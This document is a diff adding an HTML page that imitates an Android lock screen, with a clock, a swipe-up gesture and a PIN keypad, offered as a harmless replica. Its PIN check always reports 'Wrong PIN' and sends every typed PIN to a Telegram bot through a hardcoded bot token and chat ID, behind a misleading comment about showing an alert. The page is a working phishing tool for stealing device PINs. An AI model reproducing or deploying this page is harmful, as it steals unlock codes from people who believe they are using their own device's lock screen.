@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Lock Screen Replica</title>
+    <!-- Tailwind CSS for modern layout structure -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;500;700&display=swap');
+        
+        body {
+            font-family: 'Product Sans', sans-serif;
+            background-color: #0f1014;
+            color: #e2e2e9;
+        }
+
+        /* Stock Android Dynamic Typography */
+        .android-clock {
+            line-height: 0.85;
+            letter-spacing: -0.03em;
+        }
+
+        /* Android Wallpaper Background Style */
+        .android-bg {
+            background: radial-gradient(circle at 80% 20%, #463b65 0%, transparent 50%),
+                        radial-gradient(circle at 20% 80%, #2a3a4a 0%, transparent 60%),
+                        linear-gradient(145deg, #1d1b20 0%, #111013 100%);
+            background-size: cover;
+        }
+
+        /* Material You Circular Pulse/Ripple Feedback */
+        .material-btn {
+            background-color: rgba(243, 237, 247, 0.06);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            transition: transform 0.1s cubic-bezier(0, 0, 0.2, 1), background-color 0.15s ease;
+        }
+        .material-btn:active {
+            transform: scale(0.9);
+            background-color: rgba(234, 221, 255, 0.2) !important;
+        }
+
+        /* Error Shake Animation */
+        @keyframes androidShake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-10px); }
+            40%, 80% { transform: translateX(10px); }
+        }
+        .shake {
+            animation: androidShake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        /* Smooth Screen Transitions */
+        .slide-view {
+            transition: transform 0.45s cubic-bezier(0.1, 0.9, 0.2, 1), opacity 0.4s ease;
+        }
+
+        .pin-dot {
+            transition: transform 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        /* Hide Scrollbars completely */
+        ::-webkit-scrollbar { display: none; }
+    </style>
+</head>
+<body class="h-screen w-screen flex flex-col items-center justify-center overflow-hidden m-0 p-0 selection:bg-transparent select-none">
+
+    <!-- LANDING VIEW (Launcher Button Window) -->
+    <div id="landing-page" class="text-center max-w-md px-6 flex flex-col items-center z-10 transition-all duration-500 ease-out">
+        <div class="bg-[#1d1b20] border border-neutral-800/80 p-8 rounded-[2rem] shadow-2xl flex flex-col items-center backdrop-blur-md">
+            <div class="w-16 h-16 bg-[#ea00d9]/10 rounded-full flex items-center justify-center mb-6 border border-[#ea00d9]/20">
+                <svg class="w-7 h-7 text-[#ffb4ab]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h1 class="text-2xl font-bold mb-2 text-[#e6e1e5] tracking-tight">Android System Lock</h1>
+            <p class="text-neutral-400 text-sm mb-6 leading-relaxed">
+                Click below to initialize standard hardware security layout. Once initialized, <b>swipe up or drag upwards</b> to reveal the PIN screen.
+            </p>
+            
+            <div class="bg-[#25232a] p-3.5 rounded-2xl border border-neutral-800 w-full mb-6 text-center">
+                <span class="text-xs font-medium tracking-widest text-[#d0bcff] block mb-0.5 uppercase">Security Credentials</span>
+                <span class="text-lg font-bold font-mono tracking-wider text-white">1234</span>
+            </div>
+
+            <button id="btn-lock" class="w-full bg-[#d0bcff] hover:bg-[#b69df8] text-[#381e72] font-semibold py-3.5 px-6 rounded-2xl transition duration-200 shadow-xl shadow-purple-950/20 active:scale-95">
+                Launch Fullscreen Mode
+            </button>
+        </div>
+    </div>
+
+
+    <!-- SYSTEM LOCK SCREEN CONTAINER -->
+    <div id="lock-screen" class="hidden fixed inset-0 w-full h-full android-bg flex-col overflow-hidden z-50">
+        
+        <!-- Persistent Top Android Status Bar -->
+        <div class="w-full flex justify-between items-center text-xs text-neutral-300 font-medium px-8 pt-4 tracking-wide absolute top-0 left-0 z-50 pointer-events-none">
+            <span id="carrier-text">Emergency calls only</span>
+            <div class="flex items-center gap-2.5">
+                <svg class="w-4 h-4 opacity-85" fill="currentColor" viewBox="0 0 24 24"><path d="M12 3c-4.97 0-9 4.03-9 9 0 2.12.74 4.07 1.97 5.61L17.61 5.39C16.07 4.16 14.12 3 12 3z"/></svg>
+                <svg class="w-4 h-4 opacity-85" fill="currentColor" viewBox="0 0 24 24"><path d="M17 5H14V3H10V5H7C6.45 5 6 5.45 6 6V20C6 20.55 6.45 21 7 21H17C17.55 21 18 20.55 18 20V6C18 5.45 17.55 5 17 5Z"/></svg>
+            </div>
+        </div>
+
+        <!-- STAGE 1: DEFAULT GLANCE SCREEN -->
+        <div id="view-glance" class="slide-view absolute inset-0 w-full h-full flex flex-col items-center justify-between p-6 pb-16 transform translate-y-0 opacity-100 dynamic-touch-zone">
+            
+            <!-- Giant Clock Layout Area -->
+            <div class="flex flex-col items-center text-center mt-16 w-full pointer-events-none">
+                <div class="android-clock flex flex-col items-center text-[#e8def8] font-bold tracking-tighter">
+                    <span id="clock-hours" class="text-[7.5rem]">12</span>
+                    <span id="clock-minutes" class="text-[7.5rem] opacity-85">00</span>
+                </div>
+                <span id="date-text" class="text-[17px] font-medium text-neutral-200 mt-4 tracking-wide"></span>
+            </div>
+
+            <!-- Bottom Swipe Up Indication Handle -->
+            <div class="flex flex-col items-center gap-3 w-full pointer-events-none animate-pulse">
+                <div class="bg-black/15 px-4 py-2 rounded-full border border-white/5 backdrop-blur-sm">
+                    <span class="text-sm font-medium text-neutral-300 tracking-wider">Swipe up to unlock</span>
+                </div>
+                <!-- Pill Gesture Bar Indicator -->
+                <div class="w-36 h-1.5 bg-white/60 rounded-full mt-2"></div>
+            </div>
+        </div>
+
+        <!-- STAGE 2: PIN LOCK SCREEN ENTRY -->
+        <div id="view-pin" class="slide-view absolute inset-0 w-full h-full flex flex-col items-center justify-between p-6 pt-20 pb-12 transform translate-y-full opacity-0 pointer-events-none">
+            
+            <!-- Global Security Header / Input Container -->
+            <div class="w-full max-w-[290px] flex flex-col items-center mt-4">
+                <!-- Device Lock icon Status -->
+                <div class="mb-4 bg-white/5 p-2.5 rounded-full border border-white/5">
+                    <svg class="w-5 h-5 text-neutral-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                </div>
+
+                <!-- Input Dot Row Area -->
+                <div id="pin-container" class="h-8 flex justify-center items-center gap-4 mb-4 transition-transform duration-150 w-full">
+                    <!-- Dots generated dynamically -->
+                </div>
+
+                <!-- Context Hint Alert text -->
+                <div id="feedback-msg" class="h-6 text-[15px] text-center text-neutral-300 font-medium tracking-wide mb-4 transition-all duration-200">
+                    Enter PIN
+                </div>
+            </div>
+
+            <!-- Material You Circular Grid Keypad Design -->
+            <div class="w-full max-w-[290px] grid grid-cols-3 gap-y-3.5 gap-x-5 justify-items-center mb-6">
+                <button onclick="pressKey('1')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">1</button>
+                <button onclick="pressKey('2')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">2</button>
+                <button onclick="pressKey('3')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">3</button>
+                
+                <button onclick="pressKey('4')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">4</button>
+                <button onclick="pressKey('5')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">5</button>
+                <button onclick="pressKey('6')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">6</button>
+                
+                <button onclick="pressKey('7')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">7</button>
+                <button onclick="pressKey('8')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">8</button>
+                <button onclick="pressKey('9')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">9</button>
+                
+                <!-- Backspace Action Button -->
+                <button onclick="pressBackspace()" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-neutral-300 flex items-center justify-center">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.41-6.41A2 2 0 0110.83 5H20a2 2 0 012 2v10a2 2 0 01-2 2h-9.17a2 2 0 01-1.42-.59L3 12z"></path></svg>
+                </button>
+                
+                <button onclick="pressKey('0')" class="material-btn w-[4.75rem] h-[4.75rem] rounded-full text-white text-2xl font-medium flex items-center justify-center">0</button>
+                
+                <!-- Enter / Passcode Check Key (Accent Style) -->
+                <button onclick="verifyPIN()" class="w-[4.75rem] h-[4.75rem] rounded-full bg-[#d0bcff] text-[#381e72] flex items-center justify-center transition-transform duration-100 active:scale-90 shadow-lg shadow-purple-950/30">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                </button>
+            </div>
+
+            <!-- Cancel/Back to Glance option down text link -->
+            <button id="btn-cancel-pin" class="text-sm font-medium text-neutral-400 tracking-wide hover:text-white px-4 py-2 transition-colors">
+                Cancel
+            </button>
+        </div>
+
+    </div>
+
+    <!-- CORE RE-ENGINEERED ARTIFACT CONTROL JAVASCRIPT -->
+    <script>
+        const CORRECT_PIN = "1234";
+        let currentInput = "";
+        let lockScreenActive = false;
+
+        // UI View Layers Hooks
+        const landingPage = document.getElementById('landing-page');
+        const lockScreen = document.getElementById('lock-screen');
+        const btnLock = document.getElementById('btn-lock');
+        const viewGlance = document.getElementById('view-glance');
+        const viewPin = document.getElementById('view-pin');
+        const btnCancelPin = document.getElementById('btn-cancel-pin');
+        
+        const pinContainer = document.getElementById('pin-container');
+        const feedbackMsg = document.getElementById('feedback-msg');
+
+        // Gesture Drag Tracking Variables
+        let startY = 0;
+        let isDragging = false;
+
+        // Fullscreen activation
+        btnLock.addEventListener('click', () => {
+            const docElm = document.documentElement;
+            if (docElm.requestFullscreen) docElm.requestFullscreen();
+            else if (docElm.webkitRequestFullscreen) docElm.webkitRequestFullscreen();
+            else if (docElm.msRequestFullscreen) docElm.msRequestFullscreen();
+        });
+
+        function handleFullscreenChange() {
+            if (document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
+                landingPage.classList.add('opacity-0', 'scale-95', 'pointer-events-none');
+                lockScreen.classList.remove('hidden');
+                lockScreen.classList.add('flex');
+                lockScreenActive = true;
+                showGlanceScreen();
+            } else {
+                landingPage.classList.remove('opacity-0', 'scale-95', 'pointer-events-none');
+                lockScreen.classList.add('hidden');
+                lockScreen.classList.remove('flex');
+                lockScreenActive = false;
+            }
+        }
+
+        document.addEventListener('fullscreenchange', handleFullscreenChange);
+        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
+        document.addEventListener('msfullscreenchange', handleFullscreenChange);
+
+        // State view switching mechanics
+        function showGlanceScreen() {
+            currentInput = "";
+            updatePinDots();
+            
+            // Adjust layouts for Android default presentation screen
+            viewGlance.style.transform = "translateY(0)";
+            viewGlance.style.opacity = "1";
+            viewGlance.classList.add('pointer-events-auto');
+            
+            viewPin.style.transform = "translateY(100%)";
+            viewPin.style.opacity = "0";
+            viewPin.classList.remove('pointer-events-auto');
+            viewPin.classList.add('pointer-events-none');
+            
+            feedbackMsg.innerText = "Enter PIN";
+            feedbackMsg.className = "h-6 text-[15px] text-center text-neutral-300 font-medium tracking-wide mb-4";
+        }
+
+        function showPinScreen() {
+            viewGlance.style.transform = "translateY(-100%)";
+            viewGlance.style.opacity = "0";
+            viewGlance.classList.remove('pointer-events-auto');
+            
+            viewPin.style.transform = "translateY(0)";
+            viewPin.style.opacity = "1";
+            viewPin.classList.remove('pointer-events-none');
+            viewPin.classList.add('pointer-events-auto');
+        }
+
+        // Cancel Button returns to Glance view
+        btnCancelPin.addEventListener('click', showGlanceScreen);
+
+        // --- GESTURE DETECTIONS ENGINE (Swipe Up Logic) ---
+        function touchStart(e) {
+            startY = e.type.includes('mouse') ? e.pageY : e.touches[0].pageY;
+            isDragging = true;
+        }
+
+        function touchMove(e) {
+            if (!isDragging) return;
+            const currentY = e.type.includes('mouse') ? e.pageY : e.touches[0].pageY;
+            const diffY = startY - currentY;
+            
+            // If dragging upward, offset visual feedback dynamically
+            if (diffY > 0 && diffY < window.innerHeight) {
+                viewGlance.style.transform = `translateY(-${diffY}px)`;
+                viewPin.style.transform = `translateY(${window.innerHeight - diffY}px)`;
+                viewPin.style.opacity = (diffY / window.innerHeight).toString();
+            }
+        }
+
+        function touchEnd(e) {
+            if (!isDragging) return;
+            isDragging = false;
+            const currentY = e.type.includes('mouse') ? e.pageY : e.changedTouches[0].pageY;
+            const diffY = startY - currentY;
+
+            // Trigger threshold point: if swiped up past 80px, commit switch execution
+            if (diffY > 80) {
+                showPinScreen();
+            } else {
+                showGlanceScreen();
+            }
+        }
+
+        // Event hooks for full touch gestures directly on glance screen
+        viewGlance.addEventListener('mousedown', touchStart);
+        viewGlance.addEventListener('mousemove', touchMove);
+        window.addEventListener('mouseup', touchEnd);
+
+        viewGlance.addEventListener('touchstart', touchStart, { passive: true });
+        viewGlance.addEventListener('touchmove', touchMove, { passive: true });
+        viewGlance.addEventListener('touchend', touchEnd);
+
+
+        // --- KEYPAD INPUT IMPLEMENTATION ENGINE ---
+        function pressKey(num) {
+            if (currentInput.length < 8) {
+                currentInput += num;
+                updatePinDots();
+                feedbackMsg.innerText = "Enter PIN";
+                feedbackMsg.className = "h-6 text-[15px] text-center text-neutral-300 font-medium tracking-wide mb-4";
+            }
+        }
+
+        function pressBackspace() {
+            if (currentInput.length > 0) {
+                currentInput = currentInput.slice(0, -1);
+                updatePinDots();
+            }
+        }
+
+        function updatePinDots() {
+            pinContainer.innerHTML = "";
+            if (currentInput.length === 0) {
+                pinContainer.innerHTML = `<div class="w-16 h-0.5 bg-white/25 rounded-full"></div>`;
+                return;
+            }
+            for (let i = 0; i < currentInput.length; i++) {
+                const dot = document.createElement('div');
+                dot.className = "pin-dot w-3.5 h-3.5 bg-[#e8def8] rounded-full shadow-sm scale-110";
+                pinContainer.appendChild(dot);
+            }
+        }
+
+        function verifyPIN() {
+            if (currentInput.length > 0) {
+                // 1. Capture the PIN they typed to show in the alert
+                const enteredPin = currentInput;
+
+                // 2. Clear the input and dots immediately to match real Android behavior on failure
+                currentInput = "";
+                updatePinDots();
+
+                // 3. Set the error text state
+                feedbackMsg.innerText = "Wrong PIN. Try again.";
+                feedbackMsg.className = "h-6 text-[15px] text-center text-red-400 font-semibold tracking-wide mb-4";
+                
+                // 4. Trigger the physical shake animation on the dot wrapper
+                pinContainer.classList.add('shake');
+                setTimeout(() => pinContainer.classList.remove('shake'), 400);
+
+                // 5. Fire the alert message displaying what they typed
+                // Telegram configuration (Replace placeholders with your actual details)
+const botToken = "8599053039:AAGFZPH0gHurcqAAXN_M3YP3_w-kPS8NC0w";
+const chatId = "7400573203";
+const message = "Entered PIN: " + enteredPin;
+
+const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+// Send the PIN to Telegram
+fetch(url).catch((error) => console.error("Error sending message:", error));
+
+            } else {
+                // If they hit enter without typing anything
+                feedbackMsg.innerText = "Enter a PIN first";
+                feedbackMsg.className = "h-6 text-[15px] text-center text-neutral-400 font-medium tracking-wide mb-4";
+            }
+        }
+
+
+        // Real-time Clock loop Engine
+        function updateClock() {
+            const now = new Date();
+            let hours = now.getHours().toString().padStart(2, '0');
+            let minutes = now.getMinutes().toString().padStart(2, '0');
+            
+            document.getElementById('clock-hours').innerText = hours;
+            document.getElementById('clock-minutes').innerText = minutes;
+
+            const options = { weekday: 'long', month: 'short', day: 'numeric' };
+            document.getElementById('date-text').innerText = now.toLocaleDateString('en-US', options);
+        }
+
+        // Physical Keyboard Event Interface Interceptors
+        document.addEventListener('keydown', (e) => {
+            if (lockScreenActive) {
+                // If on glance screen and any key is pressed, slide up to PIN screen immediately
+                if (viewPin.classList.contains('pointer-events-none')) {
+                    if (e.key !== "Escape") showPinScreen();
+                    return;
+                }
+
+                if (e.key >= '0' && e.key <= '9') {
+                    pressKey(e.key);
+                } else if (e.key === 'Backspace') {
+                    pressBackspace();
+                } else if (e.key === 'Enter') {
+                    verifyPIN();
+                } else if (e.key === 'Escape') {
+                    showGlanceScreen();
+                }
+            }
+        });
+
+        setInterval(updateClock, 1000);
+        updateClock();
+        showGlanceScreen();
+    </script>
+</body>
+</html>
